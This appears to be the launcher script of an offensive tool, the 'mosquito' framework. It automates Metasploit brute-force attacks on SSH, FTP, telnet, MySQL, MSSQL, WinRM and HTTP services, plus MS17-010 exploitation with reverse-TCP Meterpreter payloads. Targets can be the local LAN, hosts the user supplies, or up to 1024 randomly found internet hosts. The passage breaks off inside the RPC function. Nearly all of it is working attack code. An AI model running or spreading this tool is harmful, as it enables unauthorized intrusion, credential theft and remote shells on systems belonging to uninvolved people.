#!/bin/sh
# Author: r00t-3xp10it
# mosquito framework v:3.14.3 [STABLE]
# Suspicious Shell Activity - redteam @2019
# Automate remote brute force tasks over WAN/LAN networks
# GitHub: https://github.com/r00t-3xp10it/resource_files
# count duplicate lines: cat telnet-default-userpasslist.txt | uniq -c
##
resize -s 38 120 > /dev/nul



# variable declarations _______________________________________
#                                                             |
OS=`uname`                                                    # grab OS
SaIU=`arch`                                                   # grab arch in use
IPATH=`pwd`                                                   # grab mosquito path
htn=$(hostname)                                               # grab hostname
DiStRo=`awk '{print $1}' /etc/issue`                          # grab distribution -  Ubuntu or Kali
user=`who | awk {'print $1'}`                                 # grab username
EnV=`hostnamectl | grep Chassis | awk {'print $2'}`           # grab environement
InT3R=`netstat -r | grep "default" | awk {'print $8'}`        # grab interface in use
ver=$(cd bin && cat version | grep "=" | cut -d '=' -f2)      # mosquito  version
RANGE=`ifconfig $InT3R | egrep -w "inet" | awk {'print $2'} | cut -d '.' -f1,2,3` # ip-range parsing
# ____________________________________________________________|



# sellect attacker arch in use
if [ "$SaIU" = "i686" ] || [ "$SaIU" = "x86" ]; then
   ArCh="x86"
else
   ArCh="x64"
fi



## Colorise shell Script outputs
Colors() {
Escape="\033";
  white="${Escape}[0m";
  RedF="${Escape}[31m";
  GreenF="${Escape}[32m";
  YellowF="${Escape}[33m";
  BlueF="${Escape}[34m";
  CyanF="${Escape}[36m";
Reset="${Escape}[0m";
}



Colors;
## Make sure we are in 'resource_files' working directory
if ! [ -e "logs" ]; then
echo "---"${BlueF}
cat << !
                                                🦟__________       
              _______🦟________________________  ___(_) _  /______🦟
           __  __  __ \  __ \_  ___/  __  /  / / /_  /_  __/  __ \\
         🦟_  / / / / / /_/ /(__  )/ /_/ // /_/ /_  / / /_ / /_/ /
           /_/ /_/ /_/\____//____/ \__, / \__,_/ /_/  \__/ \____/v:$ver
                                     /_/ 🦟                             🦟
!
echo ""${Reset};
cat << !
        Before we are abble to install/execute mosquito, we need to download
         🦟mosquito working directory to our machine first and then run it.

!
echo "    ${BlueF}[${YellowF}execute${BlueF}]${white} sudo git clone https://github.com/r00t-3xp10it/resource_files.git"
echo "    ${BlueF}[${YellowF}execute${BlueF}]${white} cd resource_files && sudo chmod +x *.sh"
echo "    ${BlueF}[${YellowF}execute${BlueF}]${white} sudo ./mosquito.sh -h"
echo "" && echo "---"
sleep 1
exit
fi


## Arguments menu
time=$(date | awk {'print $4'})
while getopts ":h,:u,:i," opt; do
    case $opt in
        u)
        cd aux
        rm -f install.sh > /dev/nul 2>&1
        time=$(date | awk {'print $4'})
        echo "${BlueF}[${YellowF}$time${BlueF}]${white} Downloading/updating installer .."${Reset};sleep 1
        wget -qq https://raw.githubusercontent.com/r00t-3xp10it/resource_files/master/aux/install.sh
        chmod +x install.sh
        ./install.sh -u # update (install.sh -u)
        exit
        ;;
        i)
        cd aux && ./install.sh # install dependencies (install.sh)
        exit
        ;;
        h)
echo "---"${BlueF}
cat << !
                                                🦟__________       
              _______🦟________________________  ___(_) _  /______🦟
           __  __  __ \  __ \_  ___/  __  /  / / /_  /_  __/  __ \\
         🦟_  / / / / / /_/ /(__  )/ /_/ // /_/ /_  / / /_ / /_/ /
           /_/ /_/ /_/\____//____/ \__, / \__,_/ /_/  \__/ \____/v:$ver
                                     /_/ 🦟                             🦟
!
echo ""${Reset};
echo "${BlueF}    ${RedF}:${BlueF}Framework Description_"${Reset};
cat << !
       Mosquito uses metasploit auxiliary modules + nmap nse + resource files
       to be abble to automate remote brute force tasks over WAN/LAN networks.
       'scan Local Lan, scan user inputs (rhosts),Search WAN for random hosts'

!
echo "${BlueF}    ${RedF}:${BlueF}Framework Info_"${Reset};
cat << !
       Author: r00t-3xp10it
       Suspicious Shell Activity🦟redteam @2019🦟
       https://github.com/r00t-3xp10it/resource_files

!
echo "${BlueF}    ${RedF}:${BlueF}Dependencies_"${Reset};
cat << !
       zenity|metasploit|nmap|dig|geoiplookup|http-winrm.nse
       curl|freevulnsearch.nse|multi_services_wordlist.txt

!
echo "${BlueF}    ${RedF}:${BlueF}Limitations_"${Reset};
cat << !
       a) mosquito accepts only ip addr inputs,not domain names
       b) brute force takes time, use 'CTRL+C' to abort scan(s)
       c) mosquito dicionarys can be found under \bin\wordlists
       d) finding valid creds sometimes fails to spanw a shell
       e) having multiple sessions open migth slowdown your pc

!
echo "${BlueF}    ${RedF}:${BlueF}Install/Update_"${Reset};
cat << !
       cd resource_files
       find ./ -name "*.sh" -exec chmod +x {} \;
       update  - sudo ./mosquito.sh -u
       install - sudo ./mosquito.sh -i

!
echo "${BlueF}    ${RedF}:${BlueF}Execution_"${Reset};
cat << !
       sudo ./mosquito.sh
!
echo "---"
        exit
        ;;
        \?)
        echo "${RedF}[x] Invalid option: -${white}$OPTARG"${Reset}; >&2
        exit
        ;;
    esac
done



## Make sure we have installed mosquito
if ! [ -f "aux/install.log" ]; then
echo "---"${BlueF}
cat << !
                                                🦟__________       
              _______🦟________________________  __(_)  _  /______🦟
           __  __  __ \  __ \_  ___/  __  /  / / /_  /_  __/  __ \\
         🦟_  / / / / / /_/ /(__  )/ /_/ // /_/ /_  / / /_ / /_/ /
           /_/ /_/ /_/\____//____/ \__, / \__,_/ /_/  \__/ \____/v:$ver
                                     /_/ 🦟                             🦟
!
echo ${white}"---${YellowF}               'Mosquito reports that its ${RedF}not${YellowF} installed'."${Reset};
echo ""
   echo -n "${BlueF}[${YellowF}i${BlueF}] Do you wish to install 🦟mosquito dependencies now? (y/n):"${Reset};read quer
   if [ "$quer" = "y" ] || [ "$quer" = "Y" ]; then
      cd aux && ./install.sh # install dependencies (install.sh)
   fi
fi




###################################################################
#                * 🦟 FRAMEWORK MAIN FUNCTIONS 🦟 *               #
###################################################################
service postgresql start | zenity --progress --pulsate --title "🦟 PLEASE WAIT 🦟" --text="Starting postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1

#
# geo_location funcion
#
sh_one () {
   echo "${BlueF}[${YellowF}running${BlueF}]:${white} geo_location resource_"${Reset};
   sleep 1
   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" TRUE "Scan user inputs (rhosts)" FALSE "Scan user input host list (file.txt)" FALSE "Internal ip addr to external ip Resolver" --width 330 --height 200) > /dev/null 2>&1
   #
   ## Sellect the type of scan to use
   #
   if [ "$scan" = "Scan user inputs (rhosts)" ]; then
      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 162.246.22.133 104.96.180.140" --width 450) > /dev/null 2>&1
      echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
      packag=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect geolocation package" --radiolist --column "Pick" --column "Option" TRUE "Curl" FALSE "geoiplookup" --width 328 --height 175) > /dev/null 2>&1
         if [ "$packag" = "Curl" ]; then
            echo "${BlueF}[☠]${white} Using curl package to resolve"${Reset};
            msfconsole -q -x "setg USE_CURL true;setg RHOSTS $rhost;resource geo_location.rc"
         else
            echo "${BlueF}[☠]${white} Using geoiplookup package to resolve"${Reset};
            msfconsole -q -x "setg GOOGLE_MAP true;setg RHOSTS $rhost;resource geo_location.rc"
         fi
   #
   # Scan user input host list (file.txt)
   #
   elif [ "$scan" = "Scan user input host list (file.txt)" ]; then
      echo "${BlueF}[☠]${white} Scanning User input host list (file.txt)"${Reset};
      list=$(zenity --title "🦟 MOSQUITO 🦟" --filename=$IPATH --file-selection --text "chose host list to use") > /dev/null 2>&1
      packag=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect geolocation package" --radiolist --column "Pick" --column "Option" TRUE "Curl" FALSE "geoiplookup" --width 328 --height 175) > /dev/null 2>&1
         if [ "$packag" = "Curl" ]; then
            echo "${BlueF}[☠]${white} Using curl package to resolve"${Reset};
            msfconsole -q -x "setg USE_CURL true;setg TXT_IMPORT $list;resource geo_location.rc"
         else
            echo "${BlueF}[☠]${white} Using geoiplookup package to resolve"${Reset};
            msfconsole -q -x "setg GOOGLE_MAP true;setg TXT_IMPORT $list;resource geo_location.rc"
         fi
   #
   # Internal ip addr to external ip Resolver (dig)
   #
   elif [ "$scan" = "Internal ip addr to external ip Resolver" ]; then
      echo "${BlueF}[☠]${white} Resolving Internal ip addr to external ip"${Reset};
      packag=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect geolocation package" --radiolist --column "Pick" --column "Option" TRUE "Curl" FALSE "geoiplookup" --width 328 --height 175) > /dev/null 2>&1
         if [ "$packag" = "Curl" ]; then
            echo "${BlueF}[☠]${white} Using curl package to resolve"${Reset};
            msfconsole -q -x "setg USE_CURL true;setg RESOLVER true;resource geo_location.rc"
         else
            echo "${BlueF}[☠]${white} Using geoiplookup package to resolve"${Reset};
            msfconsole -q -x "setg GOOGLE_MAP true;setg RESOLVER true;resource geo_location.rc"
         fi
   else
      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
      sleep 2 && sh_main
   fi
sh_main
}



#
# brute_force most common services
#
sh_two () {
   echo "${BlueF}[${YellowF}running${BlueF}]:${white} brute_force resource_"${Reset};
   sleep 1
   IPADDR=`ifconfig $InT3R | egrep -w "inet" | awk {'print $2'}` # grab local ip address
   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
   echo "$RANGE" > ip_range.txt
   #
   # Sellect the type of scan to use
   #
   if [ "$scan" = "Scan Local Lan" ]; then
      echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24"${Reset};
      msfconsole -q -x "setg RHOSTS $RANGE.0/24;setg LHOST $IPADDR;resource brute_force.rc"
   #
   # scanning user inputs
   #
   elif [ "$scan" = "Scan user input rhosts" ]; then
      echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 216.15.177.33 162.246.22.133" --width 450) > /dev/null 2>&1
      msfconsole -q -x "setg RHOSTS $rhost;setg LHOST $IPADDR;resource brute_force.rc"
   #
   # scanning ramdom WAN hosts
   #
   elif [ "$scan" = "Random search WAN for rhosts" ]; then
      echo "${BlueF}[☠]${white} Random Search WAN for targets"${Reset};
      sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 250 (max = 1024)" --width 300) > /dev/null 2>&1

      max="1024"
      rm -f 1024 > /dev/nul 2>&1
      ## Make sure the LIMMIT value did not have exceded the max allowed
      if [ $sealing -gt $max ]; then
         echo ${RedF}"[x]${white} LIMMIT SET TO HIGTH:${RedF}$sealing${white}, SETTING TO MAX ALLOWED.."${Reset};
         sealing="1024"
         sleep 1
      fi
      echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
      msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;setg LHOST $IPADDR;resource brute_force.rc"
   else
      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
      sleep 2 && sh_main
   fi
sh_main
}



#
# brute_force ms17_010 (smb) service(s)
#
sh_tree () {
   echo "${BlueF}[${YellowF}running${BlueF}]:${white} ms17_010 resource_"${Reset};
   sleep 1
   IPADDR=`ifconfig $InT3R | egrep -w "inet" | awk {'print $2'}` # grab local ip address
   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
   payload=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "\nSellect exploitation Payload:" --radiolist --column "Pick" --column "Option" FALSE "generic/shell_reverse_tcp" TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_tcp" --width 353 --height 220) > /dev/null 2>&1
   echo "$RANGE" > ip_range.txt
   #
   # Sellect the type of scan to use
   #
   if [ "$scan" = "Scan Local Lan" ]; then
      echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24"${Reset};
      msfconsole -q -x "setg RHOSTS $RANGE.0/24;setg LHOST $IPADDR;setg PAYLOAD $payload;resource ms17_010.rc"
   #
   # scanning user inputs
   #
   elif [ "$scan" = "Scan user input rhosts" ]; then
      echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 46.147.255.230 194.58.118.182" --width 450) > /dev/null 2>&1
      msfconsole -q -x "setg RHOSTS $rhost;setg LHOST $IPADDR;setg PAYLOAD $payload;resource ms17_010.rc"
   #
   # scanning ramdom WAN hosts
   #
   elif [ "$scan" = "Random search WAN for rhosts" ]; then
      echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
      sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 500 (max = 1024)" --width 300) > /dev/null 2>&1

      max="1024"
      rm -f 1024 > /dev/nul 2>&1
      ## Make sure the LIMMIT value did not have exceded the max allowed
      if [ $sealing -gt $max ]; then
         echo ${RedF}"[x]${white} LIMMIT SET TO HIGTH:${RedF}$sealing${white}, SETTING TO MAX ALLOWED.."${Reset};
         sealing="1024"
         sleep 1
      fi
      echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
      msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;setg LHOST $IPADDR;setg PAYLOAD $payload;resource ms17_010.rc"
   else
      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
      sleep 2 && sh_main
   fi
sh_main
}



#
# Brute Force ssh service :: done
#
sh_quatro () {
   echo "${BlueF}[${YellowF}running${BlueF}]:${white} ssh_brute resource_"${Reset};
   sleep 1
   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
   echo "$RANGE" > ip_range.txt
   #
   # Sellect the type of scan to use
   #
   if [ "$scan" = "Scan Local Lan" ]; then
      echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24"${Reset};
      msfconsole -q -x "setg RHOSTS $RANGE.0/24;resource ssh_brute.rc"
   #
   # scanning user inputs
   #
   elif [ "$scan" = "Scan user input rhosts" ]; then
      echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 147.162.198.31 41.225.253.172" --width 450) > /dev/null 2>&1
      msfconsole -q -x "setg RHOSTS $rhost;resource ssh_brute.rc"
   #
   # scanning ramdom WAN hosts
   #
   elif [ "$scan" = "Random search WAN for rhosts" ]; then
      echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
      sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 250 (max = 1024)" --width 300) > /dev/null 2>&1

      max="1024"
      ## Make sure the LIMMIT value did not have exceded the max allowed
      if [ $sealing -gt $max ]; then
         echo ${RedF}"[x]${white} LIMMIT SET TO HIGTH:${RedF}$sealing${white}, SETTING TO MAX ALLOWED.."${Reset};
         sealing="1024"
         sleep 1
      fi
      echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
      msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;resource ssh_brute.rc"
   else
      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
      sleep 2 && sh_main
   fi
sh_main
}



#
# brute_force ftp service(s) :: done
#
sh_cinco () {
   echo "${BlueF}[${YellowF}running${BlueF}]:${white} ftp_brute resource_"${Reset};
   sleep 1
   IPADDR=`ifconfig $InT3R | egrep -w "inet" | awk {'print $2'}` # grab local ip address
   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
   echo "$RANGE" > ip_range.txt
   #
   # Sellect the type of scan to use
   #
   if [ "$scan" = "Scan Local Lan" ]; then
      echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24"${Reset};
      msfconsole -q -x "setg RHOSTS $RANGE.0/24;setg LHOST $IPADDR;resource ftp_brute.rc"
   #
   # scanning user inputs
   #
   elif [ "$scan" = "Scan user input rhosts" ]; then
      echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 143.191.125.117 183.17.237.229" --width 450) > /dev/null 2>&1
      msfconsole -q -x "setg RHOSTS $rhost;setg LHOST $IPADDR;resource ftp_brute.rc"
   #
   # scanning ramdom WAN hosts
   #
   elif [ "$scan" = "Random search WAN for rhosts" ]; then
      echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
      sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 400 (max = 1024)" --width 300) > /dev/null 2>&1

      max="1024"
      rm -f 1024 > /dev/nul 2>&1
      ## Make sure the LIMMIT value did not have exceded the max allowed
      if [ $sealing -gt $max ]; then
         echo ${RedF}"[x]${white} LIMMIT SET TO HIGTH:${RedF}$sealing${white}, SETTING TO MAX ALLOWED.."${Reset};
         sealing="1024"
         sleep 1
      fi
      echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
      msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;resource ftp_brute.rc"
   else
      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
      sleep 2 && sh_main
   fi
sh_main
}



#
# brute_force http (CVE) services :: done
#
sh_six () {
   echo "${BlueF}[${YellowF}running${BlueF}]:${white} http_CVE resource_"${Reset};
   sleep 1
   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
   echo "$RANGE" > ip_range.txt
   #
   # Sellect the type of scan to use
   #
   if [ "$scan" = "Scan Local Lan" ]; then
      echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24"${Reset};
      msfconsole -q -x "setg RHOSTS $RANGE.0/24;resource http_CVE.rc"
   #
   # scanning user inputs
   #
   elif [ "$scan" = "Scan user input rhosts" ]; then
      echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 154.194.198.245 66.199.38.187" --width 450) > /dev/null 2>&1
      msfconsole -q -x "setg RHOSTS $rhost;resource http_CVE.rc"
   #
   # scanning ramdom WAN hosts
   #
   elif [ "$scan" = "Random search WAN for rhosts" ]; then
      echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
      sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 250 (max = 1024)" --width 300) > /dev/null 2>&1

      max="1024"
      rm -f 1024 > /dev/nul 2>&1
      ## Make sure the LIMMIT value did not have exceded the max allowed
      if [ $sealing -gt $max ]; then
         echo ${RedF}"[x]${white} LIMMIT SET TO HIGTH:${RedF}$sealing${white}, SETTING TO MAX ALLOWED.."${Reset};
         sealing="1024"
         sleep 1
      fi
      echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
      msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;resource http_CVE.rc"
   else
      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
      sleep 2 && sh_main
   fi
sh_main
}



#
# Brute Force winrm|wsman|wsmans service(s) :: done
#
sh_seven () {
   echo "${BlueF}[${YellowF}running${BlueF}]:${white} winrm_brute resource_"${Reset};
   sleep 1
   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
   payload=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "\nSellect exploitation Payload:" --radiolist --column "Pick" --column "Option" FALSE "generic/shell_reverse_tcp" TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_tcp" --width 353 --height 220) > /dev/null 2>&1
   echo "$RANGE" > ip_range.txt
   #
   # Sellect the type of scan to use
   #
   if [ "$scan" = "Scan Local Lan" ]; then
      echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24"${Reset};
      msfconsole -q -x "setg RHOSTS $RANGE.0/24;setg PAYLOAD $payload;resource winrm_brute.rc"
   #
   # scanning user inputs
   #
   elif [ "$scan" = "Scan user input rhosts" ]; then
      echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 154.208.147.160 205.65.133.91" --width 450) > /dev/null 2>&1
      msfconsole -q -x "setg RHOSTS $rhost;setg PAYLOAD $payload;resource winrm_brute.rc"
   #
   # scanning ramdom WAN hosts
   #
   elif [ "$scan" = "Random search WAN for rhosts" ]; then
      echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
      sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 800 (max = 1024)" --width 300) > /dev/null 2>&1

      max="1024"
      rm -f 1024 > /dev/nul 2>&1
      ## Make sure the LIMMIT value did not have exceded the max allowed
      if [ $sealing -gt $max ]; then
         echo ${RedF}"[x]${white} LIMMIT SET TO HIGTH:${RedF}$sealing${white}, SETTING TO MAX ALLOWED.."${Reset};
         sealing="1024"
         sleep 1
      fi
      echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
      msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;setg PAYLOAD $payload;resource winrm_brute.rc"
   else
      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
      sleep 2 && sh_main
   fi
sh_main
}



#
# Brute Force mysql service :: done
#
sh_oito () {
   echo "${BlueF}[${YellowF}running${BlueF}]:${white} mysql_brute resource_"${Reset};
   sleep 1
   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
   echo "$RANGE" > ip_range.txt
   #
   # Sellect the type of scan to use
   #
   if [ "$scan" = "Scan Local Lan" ]; then
      echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24"${Reset};
      msfconsole -q -x "setg RHOSTS $RANGE.0/24;resource mysql_brute.rc"
   #
   # scanning user inputs
   #
   elif [ "$scan" = "Scan user input rhosts" ]; then
      echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 213.171.197.190 46.242.242.249" --width 450) > /dev/null 2>&1
      msfconsole -q -x "setg RHOSTS $rhost;resource mysql_brute.rc"
   #
   # scanning ramdom WAN hosts
   #
   elif [ "$scan" = "Random search WAN for rhosts" ]; then
      echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
      sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 500 (max = 1024)" --width 300) > /dev/null 2>&1

      max="1024"
      rm -f 1024 > /dev/nul 2>&1
      ## Make sure the LIMMIT value did not have exceded the max allowed
      if [ $sealing -gt $max ]; then
         echo ${RedF}"[x]${white} LIMMIT SET TO HIGTH:${RedF}$sealing${white}, SETTING TO MAX ALLOWED.."${Reset};
         sealing="1024"
         sleep 1
      fi
      echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
      msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;resource mysql_brute.rc"
   else
      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
      sleep 2 && sh_main
   fi
sh_main
}



#
# Brute Force mssql service :: done
#
sh_nine () {
   echo "${BlueF}[${YellowF}running${BlueF}]:${white} mssql_brute resource_"${Reset};
   sleep 1
   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
   echo "$RANGE" > ip_range.txt
   #
   # Sellect the type of scan to use
   #
   if [ "$scan" = "Scan Local Lan" ]; then
      echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24"${Reset};
      msfconsole -q -x "setg RHOSTS $RANGE.0/24;resource mssql_brute.rc"
   #
   # scanning user inputs
   #
   elif [ "$scan" = "Scan user input rhosts" ]; then
      echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 185.99.212.190 180.86.155.12" --width 450) > /dev/null 2>&1
      msfconsole -q -x "setg RHOSTS $rhost;resource mssql_brute.rc"
   #
   # scanning ramdom WAN hosts
   #
   elif [ "$scan" = "Random search WAN for rhosts" ]; then
      echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
      sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 500 (max = 1024)" --width 300) > /dev/null 2>&1

      max="1024"
      rm -f 1024 > /dev/nul 2>&1
      ## Make sure the LIMMIT value did not have exceded the max allowed
      if [ $sealing -gt $max ]; then
         echo ${RedF}"[x]${white} LIMMIT SET TO HIGTH:${RedF}$sealing${white}, SETTING TO MAX ALLOWED.."${Reset};
         sealing="1024"
         sleep 1
      fi
      echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
      msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;resource mssql_brute.rc"
   else
      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
      sleep 2 && sh_main
   fi
sh_main
}



#
# Brute Force telnet service :: done
#
sh_ten () {
   echo "${BlueF}[${YellowF}running${BlueF}]:${white} telnet_brute resource_"${Reset};
   sleep 1
   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
   echo "$RANGE" > ip_range.txt
   #
   # Sellect the type of scan to use
   #
   if [ "$scan" = "Scan Local Lan" ]; then
      echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24"${Reset};
      msfconsole -q -x "setg RHOSTS $RANGE.0/24;resource telnet_brute.rc"
   #
   # scanning user inputs
   #
   elif [ "$scan" = "Scan user input rhosts" ]; then
      echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 95.38.18.209 201.18.152.50" --width 450) > /dev/null 2>&1
      msfconsole -q -x "setg RHOSTS $rhost;resource telnet_brute.rc"
   #
   # scanning ramdom WAN hosts
   #
   elif [ "$scan" = "Random search WAN for rhosts" ]; then
      echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
      sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 600 (max = 1024)" --width 300) > /dev/null 2>&1

      max="1024"
      rm -f 1024 > /dev/nul 2>&1
      ## Make sure the LIMMIT value did not have exceded the max allowed
      if [ $sealing -gt $max ]; then
         echo ${RedF}"[x]${white} LIMMIT SET TO HIGTH:${RedF}$sealing${white}, SETTING TO MAX ALLOWED.."${Reset};
         sealing="1024"
         sleep 1
      fi
      echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
      msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;resource telnet_brute.rc"
   else
      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
      sleep 2 && sh_main
   fi
sh_main
}



#
# Brute Force RPC service :: done
#
sh_onze () {
   echo "${BlueF}[${YellowF}running${BlueF}]:${white} rpc_brute resource_"${Reset};
   sleep 1
   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
   echo "$RANGE" > ip_range.txt
   #
   # Sellect the type of scan to use
   #
